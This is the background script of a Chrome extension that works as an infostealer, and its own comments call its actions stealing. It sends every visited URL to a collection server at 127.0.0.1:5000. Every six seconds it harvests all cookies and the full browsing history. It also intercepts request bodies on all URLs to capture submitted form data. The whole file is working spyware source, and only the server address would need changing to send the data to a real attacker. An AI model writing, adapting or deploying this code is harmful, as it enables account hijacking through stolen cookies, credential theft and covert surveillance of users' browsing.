const IP ='http://127.0.0.1:5000'
const DefaultIP = IP + '/control_server'

//URL DATA

chrome.webNavigation.onCompleted.addListener((e) => {
    if (e.url != 'about:blank'){ //Only works where it is an actual web page
    
        fetch(
            `${IP}/u`, //Send it to the special route for url in the Simple Server to save in a .csv
        {
            method: "POST",
            body: JSON.stringify({ url: e.url }),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );
}}, {});



//Cookies Data



function logCookies(cookies) { //Steals all cookies
    var a = [];
    for (const cookie of cookies) {
      a.push(cookie); //Put all cookies in a list
    }
    fetch(
        `${IP}/c`, //Send it to the specific route for cookies in the Simple Server
        {
            method: "POST",
            body:JSON.stringify(a), //trasnfor the list in a suitable Json text
            headers: {
                "Content-Type": "application/json"
            }
        }
    );
  }

function logHistory(hists){ //Steal all the browsin history
    var a = []
    for(const his of hists){ //create a list with all entries instead of the form it is outputed by the function
        a.push(his) 
    }
    fetch(
        `${IP}/h`, //Send it to the specific route for history in the Simple Server
        {
            method: "POST",
            body:JSON.stringify(a),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );

}

function logFormData(form){ //Steal all form

        let data = {};
        if (form.requestBody != undefined) { //if the form is not empty
            if (form.requestBody.formData != undefined) { //take the form attributes if it has it
                data["data"] = form.requestBody.formData
            }
            if (form.requestBody.raw != undefined) { // take the webmasterfile information if it has it
                data["data"] = form.requestBody.formData.raw.join("");
            }
            fetch(
                `${IP}/f`,//Send it to the specific route for form in the Simple Server
                {
                    method: "POST",
                    body: JSON.stringify(data),
                    headers: {
                        "Content-Type": "application/json"
                    }
                }
            );
        }
    

}

chrome.alarms.create({ periodInMinutes: 0.1 }); //Create an alarm that goes every each 6 seconds

chrome.alarms.onAlarm.addListener(()=>{ //when the alarm goes
    chrome.cookies.getAll({}).then(logCookies); //steal all cookies
    chrome.history.search({ text: "" }).then(logHistory); //steal browser history

})



//Form DATA
chrome.webRequest.onBeforeRequest.addListener( //When a request is done
    (e) => {logFormData(e)}, //take it an pass it to the form stealer
    {urls: ["<all_urls>"]},
    ["requestBody"]
);